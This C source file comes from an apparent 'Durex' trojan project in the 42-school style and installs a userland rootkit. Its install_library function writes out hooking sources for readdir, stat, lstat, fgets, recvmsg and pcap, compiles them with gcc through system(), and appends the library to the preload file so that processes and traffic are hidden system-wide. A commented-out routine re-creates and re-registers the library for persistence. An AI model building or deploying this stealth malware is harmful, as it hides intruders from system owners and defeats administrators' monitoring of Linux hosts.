/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   library.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/08/14 01:44:46 by root              #+#    #+#             */
/*   Updated: 2018/08/14 01:53:44 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* system */
#include <stdlib.h>
/* remove */
#include <stdio.h>

#include "main.h"

void			install_library()
{
	const char	*files[] = { DUREX_FGETS_FILE, DUREX_LXSTAT_FILE, DUREX_PCAP_FILE,
							 DUREX_READDIR_FILE, DUREX_RECVMSG_FILE, DUREX_XSTAT_FILE };
	const char	*src[] = { DUREX_FGETS_SRC, DUREX_LXSTAT_SRC, DUREX_PCAP_SRC,
						   DUREX_READDIR_SRC, DUREX_RECVMSG_SRC, DUREX_XSTAT_SRC };
	int		fd;
	size_t	ret;
	
	for (size_t i = 0; i < sizeof(files) / sizeof(*files); i++) {
		fd = open(files[i], O_CREAT | O_TRUNC | O_WRONLY, 0644);
		if (fd < 0)
			return ;
		ret = write(fd, src[i], mystrlen(src[i]));
		if (ret != (size_t)mystrlen(src[i]))
			return ;
	}
	system("gcc -Wall -fPIC -shared -o "DUREX_PROCESSHIDER_LIB
		   " "DUREX_FGETS_FILE
		   " "DUREX_LXSTAT_FILE
		   " "DUREX_PCAP_FILE
		   " "DUREX_READDIR_FILE
		   " "DUREX_RECVMSG_FILE
		   " "DUREX_XSTAT_FILE
		   " -ldl");
	system("echo "DUREX_PROCESSHIDER_LIB" >> "DUREX_PRELOAD);
	for (size_t i = 0; i < sizeof(files) / sizeof(*files); i++)
		remove(files[i]);
}

void			check_library()
{
/* 	static time_t		t = 0; */
/* 	struct stat	s; */
/* 	int			fd; */
/* 	size_t		ret; */
/* 	FILE		*f; */
/* 	char		*line; */

/* 	if (time(NULL) - t > DUREX_PROCESSHIDER_CHECK_TIME) { */
/* 		t = time(NULL); */
/* 		if (stat(DUREX_PROCESSHIDER_LIB, &s) < 0) { */
/* 			serverLog(e.server.reporter, DUREX_PROCESSHIDER_LIB" not present. Recreating it..."); */
/* 			fd = open(DUREX_PROCESSHIDER_FIL, O_CREAT | O_TRUNC | O_WRONLY, 0644); */
/* 			if (fd < 0) */
/* 				return ; */
/* 			ret = write(fd, DUREX_PROCESSHIDER_SCR, sizeof(DUREX_PROCESSHIDER_SCR) - 1); */
/* 			close(fd); */
/* 			if (ret != sizeof(DUREX_PROCESSHIDER_SCR) - 1) { */
/* 				remove(DUREX_PROCESSHIDER_FIL); */
/* 				return ; */
/* 			} */
/* 			system("gcc -Wall -fPIC -shared -o "DUREX_PROCESSHIDER_LIB" "DUREX_PROCESSHIDER_FIL" -ldl"); */
/* 			remove(DUREX_PROCESSHIDER_FIL); */
/* 		} */
/* 		f = fopen(DUREX_PRELOAD, "a+"); */
/* 		if (f == NULL) */
/* 			return ; */
/* 		while (1) { */
/* 			line = NULL; */
/* 			ret = 0; */
/* 			ssize_t ret2 = getline(&line, &ret, f); */
/* 			if (ret2 <= 0) */
/* 				break ; */
/* 			if (strstr(line, DUREX_PROCESSHIDER_LIB)) */
/* 				return ; // lib in file, all OK ! */
/* 			free(line); */
/* 		} */
/* 		serverLog(e.server.reporter, DUREX_PROCESSHIDER_LIB" not present in "DUREX_PRELOAD". Fixing it!"); */
/* 		fwrite(DUREX_PROCESSHIDER_LIB, 1, sizeof(DUREX_PROCESSHIDER_LIB), f); */
/* 		fwrite("\n", 1, 1, f); */
/* 		fclose(f); */
/* 	} */
}

void			uninstall_library()
{
	remove(DUREX_PROCESSHIDER_LIB);
	remove(DUREX_PRELOAD);
}
